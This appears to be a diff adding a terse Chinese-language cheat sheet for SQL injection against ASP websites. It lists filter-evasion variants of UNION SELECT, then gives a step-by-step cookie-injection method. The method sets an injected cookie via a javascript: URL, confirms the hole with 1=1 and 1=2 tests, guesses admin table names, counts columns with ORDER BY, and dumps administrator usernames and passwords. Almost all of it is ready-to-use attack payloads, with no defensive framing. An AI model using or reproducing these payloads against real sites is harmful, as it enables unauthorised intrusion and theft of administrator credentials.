@@ -1,0 +1,38 @@
+%23是代表# 
+
+继续按照常规的手法注射： 
+id=-17+UNION+SELECT+1,2, 3,4,5,6--
+
+select
+
+selec%74
+/*!sElEcT*/
+
+
+cookie注入 
+
+
+http://www.xxx.com/news.asp?id=37
+去掉37 将不显示新闻
+地址栏输入
+asp?id=javascript:alert(document.cookie="id="+escape("137 and 1=1"));  正常
+asp?id=javascript:alert(document.cookie="id="+escape("137 and 1=2"));  不正常
+说明存在cookie注入
+猜表名  
+asp?id=javascript:alert(document.cookie="id="+escape("137 and (select count(*) from admin)
+>0"));
+正常则说明存在admin这个表名 不然就要换其他的  manage manager master system user  user boss
+...
+asp?id=javascript:alert(document.cookie="id="+escape("137 order by 10"));
+先大的数值 不正常  直到数值越来越小 正常了   字段数就是多长
+接下来就是爆管理员 帐号 密码
+asp?id=javascript:alert(document.cookie="id="+escape("137 and 1=2 union select 1，2，3，5，6
+，7，8，9，10 from admin"));
+如果报错 4 和 7  
+4 该为 username     不正常换其他字段名 
+7 改为 password     不正常换其他字段名 
+获得帐号密码
+
+
+
+ 
